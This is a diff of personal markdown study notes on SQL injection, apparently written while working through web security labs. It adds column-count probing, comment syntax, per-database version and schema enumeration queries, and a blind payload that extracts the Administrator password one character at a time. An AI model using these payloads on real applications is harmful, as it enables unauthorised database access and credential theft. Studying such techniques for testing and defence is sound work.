@@ -40,7 +40,7 @@
 ```
 UNION SELECT NULL
 ```
-> For oracle, need to add FROM after every NULL.
+> For oracle, need to add FROM for every SELECT. Use the built in DUAL table.
 
 ##### Number of Columns using `ORDER BY`
 > Keep changing the `ORDER BY` index until an error is recieved.
@@ -62,6 +62,16 @@ UNION SELECT NULL
 2. Trigger a time delay using boolean injection to detect when the delay occurs in which boolean value.
 3. Trigger an out-of-band network interaction Out-of-band application security testing (OAST). For instance placing the data retrieved in a [[Domain Name System (DNS)]] lookup for a domain that you control.
 
+
+##### Tracking Cookies
+> Some applications use tracking cookies to gather data about usage and users.
+> They are processed by a SQL query such as: 
+```
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+> The behaviour of the website can then be used to determine how the injection is vulnerable.
+> Triggering different responses through false and true conditions.
+
 ---
 
 ### Payloads
@@ -69,7 +79,7 @@ UNION SELECT NULL
 > Try injecting: 
 * String terminators: `'` and `"`.
 * Other SQL commands: `SELECT`, `UNION`.
-* SQL comments: ` -- `.
+* SQL comments: `--` or `#`. For MySQL and Microsoft, add a space then `-` .
 
 ##### Example Payloads
 > `' OR 'a'='a ` .
@@ -98,16 +108,53 @@ SELECT * FROM information_schema.tables
 
 ### Enumerating Database
 
-> Get the database version.
+> Get the database information and version.
 ```
-SELECT * FROM v$version;    //oracle
-SELECT 
+SELECT BANNER FROM v$version;    //oracle
+SELECT version FROM v$instance   //oracle
+SELECT @@version  //microsoft and MySQL
+SELECT version() // PostgreSQL
 ```
 
 > Getting the tables and their columns. Works on most databases.
 ```
 SELECT * FROM information_schema.tables;
 ```
+
+
+##### Using Information_schema
+
+> Can use the `information_schema` database present in most systems (NOT IN ORACLE) to list the tables
+```
+SELECT * FROM information_schema.tables 
+```
+> The elements in this database are:
+* TABLE_NAME
+* TABLE_CATALOG
+* TABLE_SCHEMA
+* TABLE_TYPE
+
+> Can use one of the tables output in the previous command to display the columns and data types of that table
+```
+SELECT * FROM information_schema.columns WHERE table_name= <>
+```
+> The elements in this database are same as above and:
+* COLUMN_NAME
+* DATA_TYPE
+
+##### Using Information_schema Equivalent For Oracle
+
+> List all tables using `all_tables`
+```
+SELECT * FROM all_tables
+```
+* TABLE_NAME
+
+> List columns using `all_tab_columns`
+```
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+```
+* COLUMN_NAME
 
 ---
 
@@ -118,6 +165,7 @@ SELECT * FROM information_schema.tables;
 select user(); // returns the current user
 select substring(string,position,length); //substring from the position and takes length many chrs.
 example: select substring(user(),1,1)='r'; // checks if first letter from user is r.
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
 ```
 
 > To concatenate results into one column
